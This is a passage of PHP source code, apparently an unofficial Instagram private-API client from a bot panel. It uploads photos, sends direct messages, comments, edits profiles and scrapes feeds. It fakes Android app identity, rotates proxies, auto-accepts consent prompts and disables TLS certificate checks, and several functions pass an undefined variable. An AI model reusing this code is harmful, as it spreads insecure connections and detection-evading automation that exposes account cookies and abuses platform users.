		$requestGets = ['fields' => 'update%7Bdownload_uri%2Cdownload_uri_delta_base%2Cversion_code_delta_base%2Cdownload_uri_delta%2Cfallback_to_full_update%2Cfile_size_delta%2Cversion_code%2Cpublished_date%2Cfile_size%2Cota_bundle_type%2Cresources_checksum%7D', 'custom_user_id' => $this->account_id, 'signed_body' => Signatures::generateSignature('') . '.', 'ig_sig_key_version' => '4', 'version_code' => '104766893', 'version_name' => '42.0.0.19.95', 'custom_app_id' => '124024574287414', 'custom_device_id' => $this->device_id];
		$postData = NULL;
		return $this->request('facebook_ota/?' . http_build_query($requestGets), $postData, true)[1];
	}

	public function getPresenceStatus()
	{
		$requestPosts = [];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('accounts/get_presence_disabled/', $postData, true)[1];
	}

	public function getQPFetch($surface = 4715)
	{
		$requestPosts = ['vc_policy' => 'default', '_csrftoken' => $this->token, '_uid' => $this->account_id, '_uuid' => $this->uuid, 'surface_param' => $surface, 'version' => 1, 'scale' => 2, 'query' => 'viewer() {eligible_promotions.surface_nux_id(<surface>).external_gating_permitted_qps(<external_gating_permitted_qps>).supports_client_filters(true) {edges {priority,time_range {start,end},node {id,promotion_id,max_impressions,triggers,contextual_filters {clause_type,filters {filter_type,unknown_action,value {name,required,bool_value,int_value, string_value},extra_datas {name,required,bool_value,int_value, string_value}},clauses {clause_type,filters {filter_type,unknown_action,value {name,required,bool_value,int_value, string_value},extra_datas {name,required,bool_value,int_value, string_value}},clauses {clause_type,filters {filter_type,unknown_action,value {name,required,bool_value,int_value, string_value},extra_datas {name,required,bool_value,int_value, string_value}},clauses {clause_type,filters {filter_type,unknown_action,value {name,required,bool_value,int_value, string_value},extra_datas {name,required,bool_value,int_value, string_value}}}}}},template {name,parameters {name,required,bool_value,string_value,color_value,}},creatives {title {text},content {text},footer {text},social_context {text},primary_action{title {text},url,limit,dismiss_promotion},secondary_action{title {text},url,limit,dismiss_promotion},dismiss_action{title {text},url,limit,dismiss_promotion},image.scale(<scale>) {uri,width,height}}}}}}'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('qp/fetch/', $postData, true, false, false, true)[1];
	}

	public function getProfileNotice()
	{
		$postData = NULL;
		return $this->request('users/profile_notice/', $postData, true)[1];
	}

	public function getRecentActivityInbox()
	{
		$postData = NULL;
		return $this->request('news/inbox/', $postData, true)[1];
	}

	public function getBlockedMedia()
	{
		$postData = NULL;
		return $this->request('media/blocked/', $postData, true)[1];
	}

	public function getVisualInbox()
	{
		return $this->request('direct_v2/visual_inbox/')[1];
	}

	protected function getAutoCompleteUserList()
	{
		$requestParams = ['version' => '2'];
		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		return $this->request('friendships/autocomplete_user_list/?' . $paramData)[1];
	}

	protected function getMegaphoneLog()
	{
		$requestPosts = ['type' => 'feed_aysf', 'action' => 'seen', 'reason' => '', '_uuid' => $this->uuid, 'device_id' => $this->device_id, '_csrftoken' => $this->token, 'uuid' => md5(time())];
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('megaphone/log/', $postData)[1];
	}

	protected function expose()
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, 'id' => $this->account_id, '_csrftoken' => $this->token, 'experiment' => 'ig_android_profile_contextual_feed'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
	}

	public function uploadPhoto($photo, $caption = NULL)
	{
		$endpoint = 'https://i.instagram.com/api/v1/upload/photo/';
		$boundary = Utils::generateMultipartBoundary();
		$upload_id = Utils::generateUploadId(true);
		$fileToUpload = file_get_contents($photo);
		$requestPosts = ['upload_id' => $upload_id, 'retry_context' => $caption, '_uuid' => $this->uuid, '_csrftoken' => $this->token, 'image_compression' => '{"lib_name":"moz","lib_version":"3.1.m","quality":"87"}', 'xsharing_user_ids' => json_encode([]), 'media_type' => 1];
		$requestFiles = [
			'photo' => [
				'contents' => $fileToUpload,
				'filename' => 'pending_media_' . Utils::generateUploadId(true) . '.jpg',
				'headers'  => ['Content-type: application/octet-stream', 'Content-Transfer-Encoding: binary']
			]
		];
		$index = Utils::reorderByHashCode(array_merge($requestPosts, $requestFiles));
		$result = '';

		foreach ($index as $key => $value) {
			$result .= '--' . $boundary . "\r\n";

			if (!isset($requestFiles[$key])) {
				$result .= 'Content-Disposition: form-data; name="' . $key . '"';
				$result .= "\r\n\r\n" . $value . "\r\n";
			} else {
				$file = $requestFiles[$key];

				if (isset($file['contents'])) {
					$contents = $file['contents'];
				} else {
					$contents = file_get_contents($file['filepath']);
				}

				$result .= 'Content-Disposition: form-data; name="' . $key . '"; filename="' . $file['filename'] . '"' . "\r\n";

				foreach ($file['headers'] as $headerName => $headerValue) {
					$result .= $headerName . ': ' . $headerValue . "\r\n";
				}

				$result .= "\r\n" . $contents . "\r\n";
				unset($contents);
			}
		}

		$result .= '--' . $boundary . '--';
		$postData = $result;
		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR', 'X_FB_PHOTO_WATERFALL_ID:' . Signatures::generateUUID(true), 'X-Instagram-Rupload-Params: ' . json_encode($postData)];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $endpoint);
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));

		if (2 <= Wow::get('ayar/proxyStatus')) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$upload = json_decode(substr($resp, $header_len), true);
		$this->organizeCookies($header);
		curl_close($ch);

		if ($upload['status'] == 'fail') {
			throw new Exception($upload['message']);
		}

		$configure = $this->configure($upload['upload_id'], $photo, $caption);
		$this->expose();
		return $configure;
	}

	public function direct_message($recipients, $text)
	{
		if (empty($recipients) || empty($text)) {
			throw new Exception('Recipients or text can not be empty!');
		}

		if (!is_array($recipients)) {
			$recipients = [$recipients];
		}

		$string = [];

		foreach ($recipients as $recipient) {
			$string[] = '"' . $recipient . '"';
		}

		$recipient_users = implode(',', $string);
		$requestPosts = ['text' => $text, 'recipient_users' => '[[' . $recipient_users . ']]', 'action' => 'send_item', 'client_context' => Signatures::generateUUID(true), '_csrftoken' => $this->token, '_uid' => $this->account_id];
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('direct_v2/threads/broadcast/text/', $postData)[1];
	}

	public function direct_photo($recipients, $filepath, $text)
	{
		if (empty($recipients) || empty($filepath)) {
			throw new Exception('Recipients or file can not be empty!');
		}

		if (!is_array($recipients)) {
			$recipients = [$recipients];
		}

		$string = [];

		foreach ($recipients as $recipient) {
			$string[] = '"' . $recipient . '"';
		}

		$recipient_users = implode(',', $string);
		$requestPosts = ['recipient_users' => '[[' . $recipient_users . ']]', 'text' => empty($text) ? '' : $text, 'action' => 'send_item', 'client_context' => Signatures::generateUUID(true), '_csrftoken' => $this->token, '_uid' => $this->account_id];
		$fileToUpload = file_get_contents($filepath);
		$requestFiles = [
			'photo' => [
				'contents' => $fileToUpload,
				'filename' => 'pending_media_' . Utils::generateUploadId() . '.jpg',
				'headers'  => ['Content-type: application/octet-stream', 'Content-Transfer-Encoding: binary']
			]
		];
		$boundary = Utils::generateMultipartBoundary();
		$index = Utils::reorderByHashCode(array_merge($requestPosts, $requestFiles));
		$result = '';

		foreach ($index as $key => $value) {
			$result .= '--' . $boundary . "\r\n";

			if (!isset($requestFiles[$key])) {
				$result .= 'Content-Disposition: form-data; name="' . $key . '"';
				$result .= "\r\n\r\n" . $value . "\r\n";
			} else {
				$file = $requestFiles[$key];

				if (isset($file['contents'])) {
					$contents = $file['contents'];
				} else {
					$contents = file_get_contents($file['filepath']);
				}

				$result .= 'Content-Disposition: form-data; name="' . $key . '"; filename="' . $file['filename'] . '"' . "\r\n";

				foreach ($file['headers'] as $headerName => $headerValue) {
					$result .= $headerName . ': ' . $headerValue . "\r\n";
				}

				$result .= "\r\n" . $contents . "\r\n";
				unset($contents);
			}
		}

		$postData = $result;
		$endpoint = 'https://i.instagram.com/api/v1/direct_v2/threads/broadcast/upload_photo/';
		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $endpoint);
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));

		if (2 <= Wow::get('ayar/proxyStatus')) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$upload = json_decode(substr($resp, $header_len), true);
		$this->organizeCookies($header);
		curl_close($ch);
		return $upload;
	}

	public function direct_share($media_id, $recipients, $text = NULL)
	{
		if (!is_array($recipients)) {
			$recipients = [$recipients];
		}

		$string = [];

		foreach ($recipients as $recipient) {
			$string[] = '"' . $recipient . '"';
		}

		$recipient_users = implode(',', $string);
		$requestParams = ['media_type' => 'photo'];
		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$requestPosts = ['recipient_users' => '[[' . $recipient_users . ']]', 'media_id' => $media_id, 'text' => empty($text) ? '' : $text, 'action' => 'send_item', 'client_context' => Signatures::generateUUID(true), '_csrftoken' => $this->token, '_uid' => $this->account_id];
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('direct_v2/threads/broadcast/media_share/?' . $paramData, $postData)[1];
	}

	protected function configure($upload_id, $photo, $caption = '')
	{
		$size = getimagesize($photo)[0];
		$requestPosts = [
			'_csrftoken'   => $this->token,
			'_uid'         => $this->account_id,
			'_uuid'        => $this->uuid,
			'edits'        => [
				'crop_original_size' => [$size, $size],
				'crop_zoom'          => 1.3333334,
				'crop_center'        => [0.0, -0.0]
			],
			'device'       => ['manufacturer' => $this->device->getManufacturer(), 'model' => $this->device->getModel(), 'android_version' => $this->device->getAndroidVersion(), 'android_release' => $this->device->getAndroidRelease()],
			'extra'        => ['source_width' => $size, 'source_height' => $size],
			'caption'      => $caption,
			'source_type'  => '4',
			'media_folder' => 'Camera',
			'upload_id'    => $upload_id
		];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/configure/', $postData)[1];
	}

	public function editMedia($mediaId, $captionText = '')
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'caption_text' => $captionText];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/' . $mediaId . '/edit_media/', $postData)[1];
	}

	public function removeSelftag($mediaId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('usertags/' . $mediaId . '/remove/', $postData)[1];
	}

	public function getMediaInfo($mediaId)
	{
		return $this->request('media/' . $mediaId . '/info/', NULL)[1];
	}

	public function getBroadcastInfo($broadcastId)
	{
		return $this->request('live/' . $broadcastId . '/info/')[1];
	}

	public function getBroadcastHeartbeatAndViewerCount($broadcastId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('live/' . $broadcastId . '/heartbeat_and_get_viewer_count/', $postData)[1];
	}

	public function deleteMedia($mediaId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'media_id' => $mediaId];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/' . $mediaId . '/delete/', $postData)[1];
	}

	public function comment($mediaId, $commentText)
	{
		$requestPosts = ['user_breadcrumb' => Utils::generateUserBreadcrumb(mb_strlen($commentText)), 'idempotence_token' => Signatures::generateUUID(true), '_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'comment_text' => $commentText, 'containermodule' => 'comments_feed_timeline', 'radio_type' => 'wifi-none'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/' . $mediaId . '/comment/', $postData)[1];
	}

	public function deleteComment($mediaId, $commentId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/' . $mediaId . '/comment/' . $commentId . '/delete/', $postData)[1];
	}

	public function changeProfilePicture($photo)
	{
		if (is_null($photo)) {
			echo 'Photo not valid' . "\n\n";
			return NULL;
		}

		$fileToUpload = file_get_contents($photo);
		$requestPosts = ['_csrftoken' => $this->token, '_uuid' => $this->uuid, '_uid' => $this->account_id];
		$requestPosts = Signatures::signData($requestPosts);
		$requestFiles = [
			'photo' => [
				'contents' => $fileToUpload,
				'filename' => 'profile_pic.jpg',
				'headers'  => ['Content-type: application/octet-stream', 'Content-Transfer-Encoding: binary']
			]
		];
		$boundary = Utils::generateMultipartBoundary();
		$index = Utils::reorderByHashCode(array_merge($requestPosts, $requestFiles));
		$result = '';

		foreach ($index as $key => $value) {
			$result .= '--' . $boundary . "\r\n";

			if (!isset($requestFiles[$key])) {
				$result .= 'Content-Disposition: form-data; name="' . $key . '"';
				$result .= "\r\n\r\n" . $value . "\r\n";
			} else {
				$file = $requestFiles[$key];

				if (isset($file['contents'])) {
					$contents = $file['contents'];
				} else {
					$contents = file_get_contents($file['filepath']);
				}

				$result .= 'Content-Disposition: form-data; name="' . $key . '"; filename="' . $file['filename'] . '"' . "\r\n";

				foreach ($file['headers'] as $headerName => $headerValue) {
					$result .= $headerName . ': ' . $headerValue . "\r\n";
				}

				$result .= "\r\n" . $contents . "\r\n";
				unset($contents);
			}
		}

		$result .= '--' . $boundary . '--';
		$postData = $result;
		$endpoint = 'https://i.instagram.com/api/v1/accounts/change_profile_picture/';
		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: ' . mt_rand(1000, 3700) . 'kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR'];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $endpoint);
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));

		if (2 <= Wow::get('ayar/proxyStatus')) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$upload = json_decode(substr($resp, $header_len), true, 512, JSON_BIGINT_AS_STRING);
		$this->organizeCookies($header);
		curl_close($ch);
		return $upload;
	}

	public function removeProfilePicture()
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('accounts/remove_profile_picture/', $userInfo)[1];
	}

	public function setPrivateAccount()
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('accounts/set_private/', $userInfo)[1];
	}

	public function setPublicAccount()
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('accounts/set_public/', $userInfo)[1];
	}

	public function getCurrentUser()
	{
		return $this->request('accounts/current_user/?edit=true', $userInfo)[1];
	}

	public function editProfile($url, $phone, $first_name, $biography, $email, $gender)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'external_url' => $url, 'phone_number' => $phone, 'username' => $this->username, 'first_name' => $first_name, 'biography' => $biography, 'email' => $email, 'gender' => $gender];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('accounts/edit_profile/', $postData)[1];
	}

	public function getRecentActivity($maxid = NULL)
	{
		$requestParams = [];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = (!empty($requestParams) ? http_build_query(Utils::reorderByHashCode($requestParams)) : '');
		$activity = $this->request('news/inbox/' . (!empty($paramData) ? '?' . $paramData : ''))[1];

		if ($activity['status'] != 'ok') {
			throw new Exception($activity['message'] . "\n");
			return NULL;
		}

		return $activity;
	}

	public function getFollowingRecentActivity($maxid = NULL)
	{
		$requestParams = [];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = (!empty($requestParams) ? http_build_query(Utils::reorderByHashCode($requestParams)) : '');
		$activity = $this->request('news/' . (!empty($paramData) ? '?' . $paramData : ''))[1];

		if ($activity['status'] != 'ok') {
			throw new Exception($activity['message'] . "\n");
			return NULL;
		}

		return $activity;
	}

	public function getV2Inbox()
	{
		$inbox = $this->request('direct_v2/inbox/')[1];

		if ($inbox['status'] != 'ok') {
			throw new Exception($inbox['message'] . "\n");
			return NULL;
		}

		return $inbox;
	}

	public function directThread($threadId)
	{
		$directThread = $this->request('direct_v2/threads/' . $threadId . '/')[1];

		if ($directThread['status'] != 'ok') {
			throw new Exception($directThread['message'] . "\n");
			return NULL;
		}

		return $directThread;
	}

	public function getUserTags($usernameId, $maxid = NULL)
	{
		$requestParams = ['rank_token' => $this->rank_token, 'ranked_content' => 'true'];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$tags = $this->request('usertags/' . $usernameId . '/feed/?' . $paramData)[1];

		if ($tags['status'] != 'ok') {
			throw new Exception($tags['message'] . "\n");
			return NULL;
		}

		return $tags;
	}

	public function getSelfUserTags($maxid = NULL)
	{
		return $this->getUserTags($this->account_id, $maxid);
	}

	public function tagFeed($tag, $maxid = NULL)
	{
		$requestParams = ['rank_token' => $this->rank_token, 'ranked_content' => 'true'];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$userFeed = $this->request('feed/tag/' . $tag . '/?' . $paramData)[1];

		if ($userFeed['status'] != 'ok') {
			throw new Exception($userFeed['message'] . "\n");
			return NULL;
		}

		return $userFeed;
	}

	public function getMediaLikers($mediaId)
	{
		$likers = $this->request('media/' . $mediaId . '/likers/')[1];

		if ($likers['status'] != 'ok') {
			throw new Exception($likers['message'] . "\n");
			return NULL;
		}

		return $likers;
	}

	public function getGeoMedia($usernameId)
	{
		$locations = $this->request('maps/user/' . $usernameId . '/')[1];

		if ($locations['status'] != 'ok') {
			throw new Exception($locations['message'] . "\n");
			return NULL;
		}

		return $locations;
	}

	public function getSelfGeoMedia()
	{
		return $this->getGeoMedia($this->account_id);
	}

	public function searchUsers($query)
	{
		$query = rawurlencode($query);
		$requestParams = ['q' => $query, 'timezone_offset' => date('Z')];
		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$query = $this->request('users/search/?' . $paramData)[1];

		if ($query['status'] != 'ok') {
			throw new Exception($query['message'] . "\n");
			return NULL;
		}

		return $query;
	}


	public function getUserInfoByName($username)
	{
		$query = $this->request('users/' . $username . '/usernameinfo/', NULL, true)[1];
		return $query;
	}

	public function getUserInfoByValid($username)
	{
		$query = $this->requestLogin(NULL, 'users/' . $username . '/usernameinfo/', NULL, true)[1];
		return $query;
	}

	public function getUserInfoByValidNew($username)
	{
		$query = $this->requestCheck(NULL, 'users/' . $username . '/usernameinfo/', NULL, true)[1];
		return $query;
	}

	public function getUserIDByName($username)
	{
		$query = $this->requestID($username, NULL, true);
		return ['body' => $query[1], 'proxy' => $query[2]];
	}

	public function getMediaData($permalink)
	{
		$query = $this->request("https://i.instagram.com/publicapi/oembed/?url=" . $permalink, NULL, true, $notEndpoint = true)[1];
		return $query;
	}

	public function getMediaInfoByUrl($url)
	{
		$re = '/(?:(?:http|https):\/\/)?(?:www.)?(?:instagram.com|instagr.am)\/p\/(.*?)\//';
		preg_match($re, $url, $matches);
		$url = $matches[0] . "?__a=1";
		$query = $this->request($url, NULL, true, true)[1];
		return $query;
	}

	public function getMediaInfoEmbedByCode($code)
	{
		$url = "https://www.instagram.com/p/" . $code . "/embed/";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_URL, $url);

		if ((2 <= Wow::get('ayar/proxyStatus'))) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));
			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		$response = curl_exec($ch);
		curl_close($ch);
		$reg1 = '/data-username="(.*?)" data-shortcode="(.*?)">/i';
		$reg2 = '/data-media-id="(.*?)" data-owner-id="(.*?)">/i';
		preg_match($reg1, $response, $media1);
		preg_match($reg2, $response, $media2);
		$data = array(
			"username" => $media1[1],
			"shortcode" => $code,
			"id" => $media2[1],
			"pk" => $media2[2],
		);
		return $data;
	}

	public function getMediaLikersNew($code)
	{
		$mediaId = $this->getMediaInfoEmbedByCode($code)['id'];
		$likers = $this->request('media/' . $mediaId . '/likers/')[1];
		if ($likers['status'] != 'ok') {
			throw new Exception($likers['message'] . "\n");
			return NULL;
		}
		return $likers;
	}


	public function getliveInfoByName($broadcast)
	{
		$query = $this->request('feed/user/' . $broadcast . '/story/')[1];
		return $query;
	}

	public function getUserInfoById($userId)
	{
		return $this->request('users/' . $userId . '/info/')[1];
	}

	public function getSelfUserInfo()
	{
		return $this->getUserInfoById($this->account_id);
	}

	public function searchTags($query)
	{
		$query = rawurlencode($query);
		$requestParams = ['is_typeahead' => 'true', 'q' => $query, 'rank_token' => $this->rank_token];
		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$query = $this->request('tags/search/?' . $paramData)[1];

		if ($query['status'] != 'ok') {
			throw new Exception($query['message'] . "\n");
			return NULL;
		}

		return $query;
	}

	public function consentSend()
	{
		$requestPosts = ['_uuid' => 'true', '_uid' => $this->rank_token, '_csrftoken' => $this->rank_token, 'current_screen_key' => $this->rank_token, 'updates' => json_encode(['age_consent_state' => 2, 'tos_data_policy_consent_state' => 2])];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$consent = $this->request('consent/existing_user_flow/' . $postData)[1];
		return $consent;
	}

	public function getTimelineFeed($maxid = NULL)
	{
		$requestParams = ['ranked_content' => 'true', 'rank_token' => $this->rank_token];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$timeline = $this->request('feed/timeline/?' . $paramData)[1];
		if (($timeline['message'] == 'challenge_required') || ($timeline['message'] == 'login_required') || $timeline['consent_required']) {
			return $timeline;
		} else if ($timeline['status'] != 'ok') {
			throw new Exception($timeline['message'] . "\n");
			return NULL;
		}

		return $timeline;
	}

	public function getReelsTrayFeed()
	{
		$feed = $this->request('feed/reels_tray/')[1];
		if (($feed['message'] == 'challenge_required') || ($feed['message'] == 'login_required') || $feed['consent_required']) {
			return $feed;
		} else if ($feed['status'] != 'ok') {
			throw new Exception($feed['message'] . "\n");
			return NULL;
		}

		return $feed;
	}

	public function getUserFeed($usernameId, $maxid = NULL, $minTimestamp = NULL)
	{
		$requestParams = ['ranked_content' => 'true', 'rank_token' => $this->rank_token];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		if (!empty($minTimestamp)) {
			$requestParams['min_timestamp'] = $minTimestamp;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$userFeed = $this->request('feed/user/' . $usernameId . '/?' . $paramData)[1];
		return $userFeed;
	}

	public function hikayecek($usernameId)
	{
		$feed = $this->request('feed/user/' . $usernameId . '/story/')[1];

		if ($feed['status'] != 'ok') {
			throw new Exception($feed['message'] . "\n");
		}

		return $feed;
	}

	public function getHashtagFeed($hashtagString, $maxid = NULL)
	{
